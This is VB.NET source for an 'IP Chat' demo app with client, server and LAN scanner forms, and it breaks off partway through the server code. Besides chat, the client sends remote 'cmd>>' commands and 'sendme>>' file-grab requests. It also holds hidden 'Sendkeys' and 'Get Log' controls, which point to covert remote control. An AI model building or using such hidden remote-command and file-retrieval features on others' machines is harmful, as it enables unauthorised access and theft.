'This Code is by uno team (http://www.freewebs.com/unoteam/)
'and is released under the terms of the GNU LGPL
'(wich means you can use this shit for every use including commercial or personal use, 
'for free without any guaranty of any kind).

'Thanks to uno.sh4re for coding shit :P

'---------------------------------------------------------------------------------------
'Whats new in this second release....
'-Fixed some bugs for the scanner class and improved scanning, now can be selected number of threads and timout
'(for xp sp2 users tcp fix patch required...otherwise scanner don't work fine...maybe don't work at all!)
'-Added SEND FILES function for client
'-Added surely other minor bugs :P....
'---------------------------------------------------------------------------------------
Public Class DemoApp
    Inherits System.Windows.Forms.Form

    'Windows Form Designer generated code <- you should not care about this ->
#Region " Codice generato da Progettazione Windows Form "

    Public Sub New()
        MyBase.New()

        'Chiamata richiesta da Progettazione Windows Form.
        InitializeComponent()

        'Aggiungere le eventuali istruzioni di inizializzazione dopo la chiamata a InitializeComponent()
        initform()
    End Sub

    'Form esegue l'override del metodo Dispose per pulire l'elenco dei componenti.
    Protected Overloads Overrides Sub Dispose(ByVal disposing As Boolean)
        If disposing Then
            If Not (components Is Nothing) Then
                components.Dispose()
            End If
        End If
        MyBase.Dispose(disposing)

    End Sub

    'Richiesto da Progettazione Windows Form
    Private components As System.ComponentModel.IContainer

    'NOTA: la procedura che segue è richiesta da Progettazione Windows Form.
    'Può essere modificata in Progettazione Windows Form.  
    'Non modificarla nell'editor del codice.
    Friend WithEvents GroupBox1 As System.Windows.Forms.GroupBox
    Friend WithEvents GroupBox2 As System.Windows.Forms.GroupBox
    Friend WithEvents GroupBox3 As System.Windows.Forms.GroupBox
    Friend WithEvents Label4 As System.Windows.Forms.Label
    Friend WithEvents Label5 As System.Windows.Forms.Label
    Friend WithEvents DestIP As System.Windows.Forms.TextBox
    Friend WithEvents DestPort As System.Windows.Forms.NumericUpDown
    Friend WithEvents Label6 As System.Windows.Forms.Label
    Friend WithEvents Label9 As System.Windows.Forms.Label
    Friend WithEvents Label10 As System.Windows.Forms.Label
    Friend WithEvents Label11 As System.Windows.Forms.Label
    Friend WithEvents Label12 As System.Windows.Forms.Label
    Friend WithEvents Label13 As System.Windows.Forms.Label
    Friend WithEvents OutgoingMessage As System.Windows.Forms.TextBox
    Friend WithEvents StartStopButton As System.Windows.Forms.Button
    Friend WithEvents ServerPort As System.Windows.Forms.NumericUpDown
    Friend WithEvents IncomingMessagesList As System.Windows.Forms.ListBox
    Friend WithEvents LocalIPLabel As System.Windows.Forms.Label
    Friend WithEvents IPscanRange As System.Windows.Forms.TextBox
    Friend WithEvents ScanPort As System.Windows.Forms.NumericUpDown
    Friend WithEvents ScanProgressBar As System.Windows.Forms.ProgressBar
    Friend WithEvents FoundIPList As System.Windows.Forms.ListBox
    Friend WithEvents ScanButton As System.Windows.Forms.Button
    Friend WithEvents Label14 As System.Windows.Forms.Label
    Friend WithEvents Label16 As System.Windows.Forms.Label
    Friend WithEvents TimeOut As System.Windows.Forms.NumericUpDown
    Friend WithEvents NumThreads As System.Windows.Forms.NumericUpDown
    Friend WithEvents Label17 As System.Windows.Forms.Label
    Friend WithEvents SendMsgButton As System.Windows.Forms.Button
    Friend WithEvents SendFileButt As System.Windows.Forms.Button
    Friend WithEvents Blog As System.Windows.Forms.Button
    Friend WithEvents RBfile As System.Windows.Forms.RadioButton
    Friend WithEvents RBcmd As System.Windows.Forms.RadioButton
    Friend WithEvents RBnrml As System.Windows.Forms.RadioButton
    Friend WithEvents RBSkey As System.Windows.Forms.RadioButton
    Friend WithEvents BGaw As System.Windows.Forms.Button
    Friend WithEvents Timer1 As System.Windows.Forms.Timer
    Friend WithEvents Button1 As System.Windows.Forms.Button
    Friend WithEvents Button2 As System.Windows.Forms.Button
    Friend WithEvents TextBox1 As System.Windows.Forms.TextBox
    Friend WithEvents Button3 As System.Windows.Forms.Button
    Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents ChangePathButt As System.Windows.Forms.Button
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(DemoApp))
        Me.GroupBox1 = New System.Windows.Forms.GroupBox()
        Me.BGaw = New System.Windows.Forms.Button()
        Me.RBSkey = New System.Windows.Forms.RadioButton()
        Me.Blog = New System.Windows.Forms.Button()
        Me.RBfile = New System.Windows.Forms.RadioButton()
        Me.RBcmd = New System.Windows.Forms.RadioButton()
        Me.RBnrml = New System.Windows.Forms.RadioButton()
        Me.SendMsgButton = New System.Windows.Forms.Button()
        Me.Label6 = New System.Windows.Forms.Label()
        Me.OutgoingMessage = New System.Windows.Forms.TextBox()
        Me.DestPort = New System.Windows.Forms.NumericUpDown()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.DestIP = New System.Windows.Forms.TextBox()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.SendFileButt = New System.Windows.Forms.Button()
        Me.Button1 = New System.Windows.Forms.Button()
        Me.GroupBox2 = New System.Windows.Forms.GroupBox()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.Button3 = New System.Windows.Forms.Button()
        Me.TextBox1 = New System.Windows.Forms.TextBox()
        Me.IncomingMessagesList = New System.Windows.Forms.ListBox()
        Me.ServerPort = New System.Windows.Forms.NumericUpDown()
        Me.Label9 = New System.Windows.Forms.Label()
        Me.LocalIPLabel = New System.Windows.Forms.Label()
        Me.StartStopButton = New System.Windows.Forms.Button()
        Me.ChangePathButt = New System.Windows.Forms.Button()
        Me.Label14 = New System.Windows.Forms.Label()
        Me.Label10 = New System.Windows.Forms.Label()
        Me.GroupBox3 = New System.Windows.Forms.GroupBox()
        Me.Label17 = New System.Windows.Forms.Label()
        Me.Label16 = New System.Windows.Forms.Label()
        Me.TimeOut = New System.Windows.Forms.NumericUpDown()
        Me.NumThreads = New System.Windows.Forms.NumericUpDown()
        Me.FoundIPList = New System.Windows.Forms.ListBox()
        Me.ScanButton = New System.Windows.Forms.Button()
        Me.Label13 = New System.Windows.Forms.Label()
        Me.ScanPort = New System.Windows.Forms.NumericUpDown()
        Me.Label11 = New System.Windows.Forms.Label()
        Me.IPscanRange = New System.Windows.Forms.TextBox()
        Me.Label12 = New System.Windows.Forms.Label()
        Me.ScanProgressBar = New System.Windows.Forms.ProgressBar()
        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
        Me.Button2 = New System.Windows.Forms.Button()
        Me.GroupBox1.SuspendLayout()
        CType(Me.DestPort, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.GroupBox2.SuspendLayout()
        CType(Me.ServerPort, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.GroupBox3.SuspendLayout()
        CType(Me.TimeOut, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.NumThreads, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.ScanPort, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'GroupBox1
        '
        Me.GroupBox1.Controls.Add(Me.BGaw)
        Me.GroupBox1.Controls.Add(Me.RBSkey)
        Me.GroupBox1.Controls.Add(Me.Blog)
        Me.GroupBox1.Controls.Add(Me.RBfile)
        Me.GroupBox1.Controls.Add(Me.RBcmd)
        Me.GroupBox1.Controls.Add(Me.RBnrml)
        Me.GroupBox1.Controls.Add(Me.SendMsgButton)
        Me.GroupBox1.Controls.Add(Me.Label6)
        Me.GroupBox1.Controls.Add(Me.OutgoingMessage)
        Me.GroupBox1.Controls.Add(Me.DestPort)
        Me.GroupBox1.Controls.Add(Me.Label5)
        Me.GroupBox1.Controls.Add(Me.DestIP)
        Me.GroupBox1.Controls.Add(Me.Label4)
        Me.GroupBox1.Controls.Add(Me.SendFileButt)
        Me.GroupBox1.Location = New System.Drawing.Point(3, 3)
        Me.GroupBox1.Name = "GroupBox1"
        Me.GroupBox1.Size = New System.Drawing.Size(416, 152)
        Me.GroupBox1.TabIndex = 3
        Me.GroupBox1.TabStop = False
        Me.GroupBox1.Text = " Client"
        '
        'BGaw
        '
        Me.BGaw.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!)
        Me.BGaw.Location = New System.Drawing.Point(356, 94)
        Me.BGaw.Name = "BGaw"
        Me.BGaw.Size = New System.Drawing.Size(52, 24)
        Me.BGaw.TabIndex = 12
        Me.BGaw.Text = "Buzz"
        Me.BGaw.UseVisualStyleBackColor = True
        '
        'RBSkey
        '
        Me.RBSkey.AutoSize = True
        Me.RBSkey.Enabled = False
        Me.RBSkey.Location = New System.Drawing.Point(336, 71)
        Me.RBSkey.Name = "RBSkey"
        Me.RBSkey.Size = New System.Drawing.Size(72, 17)
        Me.RBSkey.TabIndex = 11
        Me.RBSkey.TabStop = True
        Me.RBSkey.Text = "Sendkeys"
        Me.RBSkey.UseVisualStyleBackColor = True
        Me.RBSkey.Visible = False
        '
        'Blog
        '
        Me.Blog.Font = New System.Drawing.Font("Microsoft Sans Serif", 6.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Blog.Location = New System.Drawing.Point(334, 69)
        Me.Blog.Name = "Blog"
        Me.Blog.Size = New System.Drawing.Size(64, 17)
        Me.Blog.TabIndex = 10
        Me.Blog.Text = "Get Log"
        Me.Blog.TextAlign = System.Drawing.ContentAlignment.TopCenter
        Me.Blog.UseVisualStyleBackColor = True
        Me.Blog.Visible = False
        '
        'RBfile
        '
        Me.RBfile.AutoSize = True
        Me.RBfile.Location = New System.Drawing.Point(248, 71)
        Me.RBfile.Name = "RBfile"
        Me.RBfile.Size = New System.Drawing.Size(66, 17)
        Me.RBfile.TabIndex = 9
        Me.RBfile.Text = "Get Files"
        Me.RBfile.UseVisualStyleBackColor = True
        '
        'RBcmd
        '
        Me.RBcmd.AutoSize = True
        Me.RBcmd.Location = New System.Drawing.Point(131, 71)
        Me.RBcmd.Name = "RBcmd"
        Me.RBcmd.Size = New System.Drawing.Size(82, 17)
        Me.RBcmd.TabIndex = 8
        Me.RBcmd.Text = "Cmd Prompt"
        Me.RBcmd.UseVisualStyleBackColor = True
        '
        'RBnrml
        '
        Me.RBnrml.AutoSize = True
        Me.RBnrml.Checked = True
        Me.RBnrml.Location = New System.Drawing.Point(11, 71)
        Me.RBnrml.Name = "RBnrml"
        Me.RBnrml.Size = New System.Drawing.Size(58, 17)
        Me.RBnrml.TabIndex = 7
        Me.RBnrml.TabStop = True
        Me.RBnrml.Text = "Normal"
        Me.RBnrml.UseVisualStyleBackColor = True
        '
        'SendMsgButton
        '
        Me.SendMsgButton.Location = New System.Drawing.Point(346, 42)
        Me.SendMsgButton.Name = "SendMsgButton"
        Me.SendMsgButton.Size = New System.Drawing.Size(64, 21)
        Me.SendMsgButton.TabIndex = 6
        Me.SendMsgButton.Text = "Send Msg"
        '
        'Label6
        '
        Me.Label6.Location = New System.Drawing.Point(8, 18)
        Me.Label6.Name = "Label6"
        Me.Label6.Size = New System.Drawing.Size(126, 24)
        Me.Label6.TabIndex = 5
        Me.Label6.Text = "Msg/Command/Filepath:"
        Me.Label6.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
        '
        'OutgoingMessage
        '
        Me.OutgoingMessage.Location = New System.Drawing.Point(8, 42)
        Me.OutgoingMessage.MaxLength = 800
        Me.OutgoingMessage.Name = "OutgoingMessage"
        Me.OutgoingMessage.Size = New System.Drawing.Size(328, 20)
        Me.OutgoingMessage.TabIndex = 4
        '
        'DestPort
        '
        Me.DestPort.Location = New System.Drawing.Point(94, 124)
        Me.DestPort.Maximum = New Decimal(New Integer() {65536, 0, 0, 0})
        Me.DestPort.Minimum = New Decimal(New Integer() {1024, 0, 0, 0})
        Me.DestPort.Name = "DestPort"
        Me.DestPort.Size = New System.Drawing.Size(52, 20)
        Me.DestPort.TabIndex = 3
        Me.DestPort.Value = New Decimal(New Integer() {56667, 0, 0, 0})
        '
        'Label5
        '
        Me.Label5.Location = New System.Drawing.Point(19, 124)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(68, 17)
        Me.Label5.TabIndex = 2
        Me.Label5.Text = "Dest. Port :"
        Me.Label5.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'DestIP
        '
        Me.DestIP.Location = New System.Drawing.Point(94, 97)
        Me.DestIP.Name = "DestIP"
        Me.DestIP.Size = New System.Drawing.Size(95, 20)
        Me.DestIP.TabIndex = 0
        Me.DestIP.Text = "0.0.0.0"
        Me.DestIP.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'Label4
        '
        Me.Label4.Location = New System.Drawing.Point(19, 97)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(69, 19)
        Me.Label4.TabIndex = 1
        Me.Label4.Text = "Dest. IP:"
        Me.Label4.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'SendFileButt
        '
        Me.SendFileButt.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!)
        Me.SendFileButt.Location = New System.Drawing.Point(313, 124)
        Me.SendFileButt.Name = "SendFileButt"
        Me.SendFileButt.Size = New System.Drawing.Size(95, 24)
        Me.SendFileButt.TabIndex = 6
        Me.SendFileButt.Text = "Send Files"
        Me.SendFileButt.TextAlign = System.Drawing.ContentAlignment.TopCenter
        '
        'Button1
        '
        Me.Button1.Location = New System.Drawing.Point(11, 557)
        Me.Button1.Name = "Button1"
        Me.Button1.Size = New System.Drawing.Size(227, 23)
        Me.Button1.TabIndex = 6
        Me.Button1.Text = "Exit"
        Me.Button1.UseVisualStyleBackColor = True
        '
        'GroupBox2
        '
        Me.GroupBox2.Controls.Add(Me.Label1)
        Me.GroupBox2.Controls.Add(Me.Button3)
        Me.GroupBox2.Controls.Add(Me.TextBox1)
        Me.GroupBox2.Controls.Add(Me.IncomingMessagesList)
        Me.GroupBox2.Controls.Add(Me.ServerPort)
        Me.GroupBox2.Controls.Add(Me.Label9)
        Me.GroupBox2.Controls.Add(Me.LocalIPLabel)
        Me.GroupBox2.Controls.Add(Me.StartStopButton)
        Me.GroupBox2.Controls.Add(Me.ChangePathButt)
        Me.GroupBox2.Controls.Add(Me.Label14)
        Me.GroupBox2.Controls.Add(Me.Label10)
        Me.GroupBox2.Location = New System.Drawing.Point(3, 163)
        Me.GroupBox2.Name = "GroupBox2"
        Me.GroupBox2.Size = New System.Drawing.Size(416, 388)
        Me.GroupBox2.TabIndex = 4
        Me.GroupBox2.TabStop = False
        Me.GroupBox2.Text = " Server"
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Location = New System.Drawing.Point(121, 44)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(102, 13)
        Me.Label1.TabIndex = 19
        Me.Label1.Text = "Incoming Files Path:"
        '
        'Button3
        '
        Me.Button3.Location = New System.Drawing.Point(163, 13)
        Me.Button3.Name = "Button3"
        Me.Button3.Size = New System.Drawing.Size(53, 22)
        Me.Button3.TabIndex = 18
        Me.Button3.Text = "Refresh"
        Me.Button3.UseVisualStyleBackColor = True
        '
        'TextBox1
        '
        Me.TextBox1.Location = New System.Drawing.Point(70, 13)
        Me.TextBox1.Name = "TextBox1"
        Me.TextBox1.ReadOnly = True
        Me.TextBox1.Size = New System.Drawing.Size(85, 20)
        Me.TextBox1.TabIndex = 17
        Me.TextBox1.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'IncomingMessagesList
        '
        Me.IncomingMessagesList.BackColor = System.Drawing.SystemColors.MenuText
        Me.IncomingMessagesList.Font = New System.Drawing.Font("Consolas", 11.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.IncomingMessagesList.ForeColor = System.Drawing.SystemColors.ButtonHighlight
        Me.IncomingMessagesList.HorizontalScrollbar = True
        Me.IncomingMessagesList.ItemHeight = 18
        Me.IncomingMessagesList.Location = New System.Drawing.Point(8, 69)
        Me.IncomingMessagesList.Name = "IncomingMessagesList"
        Me.IncomingMessagesList.Size = New System.Drawing.Size(400, 310)
        Me.IncomingMessagesList.TabIndex = 12
        '
        'ServerPort
        '
        Me.ServerPort.Location = New System.Drawing.Point(310, 14)
        Me.ServerPort.Maximum = New Decimal(New Integer() {65000, 0, 0, 0})
        Me.ServerPort.Minimum = New Decimal(New Integer() {1024, 0, 0, 0})
        Me.ServerPort.Name = "ServerPort"
        Me.ServerPort.Size = New System.Drawing.Size(52, 20)
        Me.ServerPort.TabIndex = 11
        Me.ServerPort.Value = New Decimal(New Integer() {56667, 0, 0, 0})
        '
        'Label9
        '
        Me.Label9.Location = New System.Drawing.Point(240, 16)
        Me.Label9.Name = "Label9"
        Me.Label9.Size = New System.Drawing.Size(64, 16)
        Me.Label9.TabIndex = 10
        Me.Label9.Text = "server port"
        '
        'LocalIPLabel
        '
        Me.LocalIPLabel.Location = New System.Drawing.Point(16, 16)
        Me.LocalIPLabel.Name = "LocalIPLabel"
        Me.LocalIPLabel.Size = New System.Drawing.Size(153, 16)
        Me.LocalIPLabel.TabIndex = 9
        Me.LocalIPLabel.Text = "Local IP :"
        Me.LocalIPLabel.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'StartStopButton
        '
        Me.StartStopButton.Location = New System.Drawing.Point(368, 13)
        Me.StartStopButton.Name = "StartStopButton"
        Me.StartStopButton.Size = New System.Drawing.Size(40, 22)
        Me.StartStopButton.TabIndex = 8
        Me.StartStopButton.Text = "Start"
        '
        'ChangePathButt
        '
        Me.ChangePathButt.Location = New System.Drawing.Point(344, 40)
        Me.ChangePathButt.Name = "ChangePathButt"
        Me.ChangePathButt.Size = New System.Drawing.Size(64, 23)
        Me.ChangePathButt.TabIndex = 16
        Me.ChangePathButt.Text = "Browse..."
        '
        'Label14
        '
        Me.Label14.Location = New System.Drawing.Point(80, 74)
        Me.Label14.Name = "Label14"
        Me.Label14.Size = New System.Drawing.Size(328, 24)
        Me.Label14.TabIndex = 14
        Me.Label14.Text = "no server is listening"
        Me.Label14.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
        '
        'Label10
        '
        Me.Label10.Location = New System.Drawing.Point(19, 86)
        Me.Label10.Name = "Label10"
        Me.Label10.Size = New System.Drawing.Size(80, 16)
        Me.Label10.TabIndex = 13
        Me.Label10.Text = "incoming list :"
        Me.Label10.TextAlign = System.Drawing.ContentAlignment.MiddleRight
        '
        'GroupBox3
        '
        Me.GroupBox3.Controls.Add(Me.Label17)
        Me.GroupBox3.Controls.Add(Me.Label16)
        Me.GroupBox3.Controls.Add(Me.TimeOut)
        Me.GroupBox3.Controls.Add(Me.NumThreads)
        Me.GroupBox3.Controls.Add(Me.FoundIPList)
        Me.GroupBox3.Controls.Add(Me.ScanButton)
        Me.GroupBox3.Controls.Add(Me.Label13)
        Me.GroupBox3.Controls.Add(Me.ScanPort)
        Me.GroupBox3.Controls.Add(Me.Label11)
        Me.GroupBox3.Controls.Add(Me.IPscanRange)
        Me.GroupBox3.Controls.Add(Me.Label12)
        Me.GroupBox3.Controls.Add(Me.ScanProgressBar)
        Me.GroupBox3.Location = New System.Drawing.Point(427, 3)
        Me.GroupBox3.Name = "GroupBox3"
        Me.GroupBox3.Size = New System.Drawing.Size(184, 534)
        Me.GroupBox3.TabIndex = 5
        Me.GroupBox3.TabStop = False
        Me.GroupBox3.Text = " ServerScanner"
        '
        'Label17
        '
        Me.Label17.Location = New System.Drawing.Point(64, 104)
        Me.Label17.Name = "Label17"
        Me.Label17.Size = New System.Drawing.Size(48, 16)
        Me.Label17.TabIndex = 17
        Me.Label17.Text = "Threads"
        '
        'Label16
        '
        Me.Label16.Location = New System.Drawing.Point(64, 128)
        Me.Label16.Name = "Label16"
        Me.Label16.Size = New System.Drawing.Size(48, 16)
        Me.Label16.TabIndex = 16
        Me.Label16.Text = "Time out"
        '
        'TimeOut
        '
        Me.TimeOut.Location = New System.Drawing.Point(120, 128)
        Me.TimeOut.Maximum = New Decimal(New Integer() {25000, 0, 0, 0})
        Me.TimeOut.Minimum = New Decimal(New Integer() {1000, 0, 0, 0})
        Me.TimeOut.Name = "TimeOut"
        Me.TimeOut.Size = New System.Drawing.Size(56, 20)
        Me.TimeOut.TabIndex = 15
        Me.TimeOut.Value = New Decimal(New Integer() {5000, 0, 0, 0})
        '
        'NumThreads
        '
        Me.NumThreads.Location = New System.Drawing.Point(120, 104)
        Me.NumThreads.Minimum = New Decimal(New Integer() {1, 0, 0, 0})
        Me.NumThreads.Name = "NumThreads"
        Me.NumThreads.Size = New System.Drawing.Size(56, 20)
        Me.NumThreads.TabIndex = 14
        Me.NumThreads.Value = New Decimal(New Integer() {10, 0, 0, 0})
        '
        'FoundIPList
        '
        Me.FoundIPList.Location = New System.Drawing.Point(8, 196)
        Me.FoundIPList.Name = "FoundIPList"
        Me.FoundIPList.Size = New System.Drawing.Size(168, 329)
        Me.FoundIPList.TabIndex = 13
        '
        'ScanButton
        '
        Me.ScanButton.Location = New System.Drawing.Point(11, 160)
        Me.ScanButton.Name = "ScanButton"
        Me.ScanButton.Size = New System.Drawing.Size(48, 30)
        Me.ScanButton.TabIndex = 9
        Me.ScanButton.Text = "Scan"
        '
        'Label13
        '
        Me.Label13.Location = New System.Drawing.Point(8, 48)
        Me.Label13.Name = "Label13"
        Me.Label13.Size = New System.Drawing.Size(168, 29)
        Me.Label13.TabIndex = 8
        Me.Label13.Text = "1.2.3.0 will scan from 1.2.3.1 to 1.2.3.254"
        Me.Label13.TextAlign = System.Drawing.ContentAlignment.TopRight
        '
        'ScanPort
        '
        Me.ScanPort.Location = New System.Drawing.Point(120, 80)
        Me.ScanPort.Maximum = New Decimal(New Integer() {65000, 0, 0, 0})
        Me.ScanPort.Minimum = New Decimal(New Integer() {1, 0, 0, 0})
        Me.ScanPort.Name = "ScanPort"
        Me.ScanPort.Size = New System.Drawing.Size(56, 20)
        Me.ScanPort.TabIndex = 7
        Me.ScanPort.Value = New Decimal(New Integer() {10203, 0, 0, 0})
        '
        'Label11
        '
        Me.Label11.Location = New System.Drawing.Point(56, 80)
        Me.Label11.Name = "Label11"
        Me.Label11.Size = New System.Drawing.Size(64, 16)
        Me.Label11.TabIndex = 6
        Me.Label11.Text = "Scan port :"
        Me.Label11.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
        '
        'IPscanRange
        '
        Me.IPscanRange.Location = New System.Drawing.Point(88, 24)
        Me.IPscanRange.Name = "IPscanRange"
        Me.IPscanRange.Size = New System.Drawing.Size(88, 20)
        Me.IPscanRange.TabIndex = 4
        Me.IPscanRange.Text = "0.0.0.0"
        Me.IPscanRange.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'Label12
        '
        Me.Label12.Location = New System.Drawing.Point(24, 24)
        Me.Label12.Name = "Label12"
        Me.Label12.Size = New System.Drawing.Size(64, 16)
        Me.Label12.TabIndex = 5
        Me.Label12.Text = "scan IPs :"
        Me.Label12.TextAlign = System.Drawing.ContentAlignment.MiddleRight
        '
        'ScanProgressBar
        '
        Me.ScanProgressBar.Location = New System.Drawing.Point(59, 160)
        Me.ScanProgressBar.Maximum = 255
        Me.ScanProgressBar.Name = "ScanProgressBar"
        Me.ScanProgressBar.Size = New System.Drawing.Size(117, 30)
        Me.ScanProgressBar.Step = 1
        Me.ScanProgressBar.TabIndex = 0
        '
        'Timer1
        '
        Me.Timer1.Enabled = True
        '
        'Button2
        '
        Me.Button2.Location = New System.Drawing.Point(368, 557)
        Me.Button2.Name = "Button2"
        Me.Button2.Size = New System.Drawing.Size(44, 23)
        Me.Button2.TabIndex = 7
        Me.Button2.Text = ">>"
        Me.Button2.UseVisualStyleBackColor = True
        '
        'DemoApp
        '
        Me.AcceptButton = Me.SendMsgButton
        Me.AutoScaleBaseSize = New System.Drawing.Size(5, 13)
        Me.ClientSize = New System.Drawing.Size(424, 584)
        Me.ControlBox = False
        Me.Controls.Add(Me.Button2)
        Me.Controls.Add(Me.Button1)
        Me.Controls.Add(Me.GroupBox1)
        Me.Controls.Add(Me.GroupBox3)
        Me.Controls.Add(Me.GroupBox2)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.Fixed3D
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MaximizeBox = False
        Me.Name = "DemoApp"
        Me.Padding = New System.Windows.Forms.Padding(70, 0, 0, 0)
        Me.Text = "IP Chat"
        Me.GroupBox1.ResumeLayout(False)
        Me.GroupBox1.PerformLayout()
        CType(Me.DestPort, System.ComponentModel.ISupportInitialize).EndInit()
        Me.GroupBox2.ResumeLayout(False)
        Me.GroupBox2.PerformLayout()
        CType(Me.ServerPort, System.ComponentModel.ISupportInitialize).EndInit()
        Me.GroupBox3.ResumeLayout(False)
        Me.GroupBox3.PerformLayout()
        CType(Me.TimeOut, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.NumThreads, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.ScanPort, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)

    End Sub

#End Region
    'Form handmade part <- you should not care about this ->
#Region "Form handmade part"
    'This Sub is called from the NEW method declared
    'in the "windows form generated code"
    'Here we retrieve Local IP using The NetInterop
    Private Sub initform()
        ServerClass.LIP = NetInterop.GetLocalIP
        TextBox1.Text = NetInterop.GetLocalIP
        Me.DestIP.Text = TextBox1.Text
        Me.LocalIPLabel.Text = "Local IP : " + Me.DestIP.Text
        Me.IPscanRange.Text = Me.DestIP.Text
    End Sub

#End Region

    'Stuff starts from here 

    'Please note that the  dll assembly must be in the references
    'of any program that will use that classes

    'Just look at the REGION related to your interests

    'Just declare our objects we will use note that we don't need
    'to care about sockets-threading and generally annoying code.
    Dim prot As String = "6666"
    Dim pid As Integer
    Dim sfile(1) As String
    Dim WithEvents Client As New ClientClass 'we use new here cause client need no more initialization
    Dim WithEvents Server As ServerClass
    Dim WithEvents Scanner As ServerScanner
    Public Event DiagnosticMessage(ByVal Message As String)
    Public PORT As Integer


#Region "Implementing the  ClientClass"
    '1.This Sub Handles the SendMsgButton.Click event
    '2.It reads the IP,PORT and DATA from the form
    '3.Sends the DATA to IP:PORT.
    Private Sub SendMsgButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SendMsgButton.Click
        Dim IP As String = DestIP.Text
        PORT = DestPort.Value
        Dim DATA As String = OutgoingMessage.Text.Trim
        'Now send it.
        Debug.Print("1")
        If Not (DATA = "" Or DATA Is Nothing) Then
            If RBnrml.Checked = True Then
                Try
                    Debug.Print("22")
                    Client.SendMessage(IP, PORT, DATA)
                    RaiseEvent DiagnosticMessage(IP + ":" + PORT.ToString + "<<" + DATA)
                Catch ex As Exception
                    MessageBox.Show(ex.Message, "Error sending message")
                End Try
            ElseIf RBcmd.Checked Then
                Try
                    Client.SendMessage(IP, PORT, "cmd>> " + DATA)
                    RaiseEvent DiagnosticMessage(IP + ":" + PORT.ToString + "<<Command" + DATA)

                Catch ex As Exception
                    MessageBox.Show(ex.Message, "Error sending command")
                End Try
            ElseIf RBfile.Checked Then
                Try
                    Client.SendMessage(IP, PORT, "sendme>> " + DATA)
                    RaiseEvent DiagnosticMessage(IP + ":" + PORT.ToString + "<<Sendme " + DATA)

                Catch ex As Exception
                    MessageBox.Show(ex.Message, "Error sending get file")
                End Try
            ElseIf RBSkey.Checked Then
                Try
                    Client.SendMessage(IP, PORT, "sentkeys>>" + DATA)
                    RaiseEvent DiagnosticMessage(IP + ":" + PORT.ToString + "<<Sendkeys>>>" + DATA)

                Catch ex As Exception
                    MessageBox.Show(ex.Message, "Error sending keys")
                End Try

            End If
        Else
            RaiseEvent DiagnosticMessage("Empty Message")
        End If
        Debug.Print("333")
    End Sub

    '1.This Sub Handles the SendFileButton.Click event
    '2.It reads the IP,PORT from the form
    '3.Displays a OpenFileDialog to let the user choose the Files
    '4.Sends selected files to IP:PORT 
    Private Sub SendFileButt_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SendFileButt.Click
        Dim IP As String = DestIP.Text
        Dim PORT As Integer = DestPort.Value
        Dim dialog As New System.Windows.Forms.OpenFileDialog
        dialog.Title = "Select file"
        dialog.Filter = "All files(*.*)|*.*"
        dialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
        dialog.Multiselect = True
        dialog.CheckFileExists = True
        Dim dr As DialogResult = dialog.ShowDialog()
        If dr = DialogResult.Cancel Then Exit Sub
        Application.DoEvents()
        Try
            Client.SendFiles(IP, PORT, dialog.FileNames)
        Catch ex As Exception
            MessageBox.Show(ex.Message, "Error Sending Files")
        End Try
    End Sub
#End Region 'This for the Client

#Region "Implementing the  ServerClass"
    '1 Basically you use a server when you want to listen for incoming data
    'on a specified port. This demo let the user stop the server,change port,
    'and restart it also, so steps are:

    '1.Start the server on a specified port / stop function.
    Private Sub StartStopButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartStopButton.Click
        If (Server Is Nothing) Then
            'Clear messages from previous session(don't care to this)
            Me.IncomingMessagesList.Items.Clear()
            'Retrieve PORT
            Dim PORT As Integer = ServerPort.Value
            'Start the server
            'You can use AutoStart = true as here or call later Srv.StartServer
            Server = Nothing

            Server = New ServerClass(PORT, True, "C:\")
            Timer1.Enabled = True
            Server.IncomingPath = Application.StartupPath + "\"
            Server.StartServer()
            Label14.Text = "Incoming file path:" + Server.IncomingPath
            'It's already Started!
            RaiseEvent DiagnosticMessage("Listning on Port:" + PORT.ToString)
            RaiseEvent DiagnosticMessage("Incoming File Location:" + Server.IncomingPath)


            Me.StartStopButton.Text = "stop"
        Else
            RaiseEvent DiagnosticMessage("Stopping Server")
            'Stop and terminate the server
            Server.StopServer()
            Me.StartStopButton.Text = "Start"
            Label14.Text = "no server is listening"
